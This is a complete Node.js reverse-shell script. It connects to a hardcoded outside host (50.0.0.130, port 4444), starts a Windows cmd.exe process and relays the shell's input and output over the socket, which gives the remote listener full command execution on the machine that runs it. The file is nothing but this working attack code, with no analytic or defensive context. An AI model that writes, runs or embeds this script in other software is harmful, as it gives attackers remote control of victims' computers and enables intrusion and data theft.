const net = require("net");
const { spawn } = require("child_process");

const host = "50.0.0.130"; 
const port = 4444;              

function connect() {
    const client = new net.Socket();
    client.connect(port, host, () => {
        console.log("Connection Successful");
		const shell = spawn('cmd.exe',[]);
		shell.stdout.on('data',(data)=> {
			client.write(data);
		});
		shell.stderr.on('data',(data)=> {
			client.write(data);
		});
		client.on('data',(data)=> {
			shell.stdin.write(data);
		});
		client.on("close", () => {
			shell.kill();
			console.log("Connection closed");
		});
    });
    client.on("error", (err) => {
        console.error("Connection failure :", err.message);
    });
}

connect();
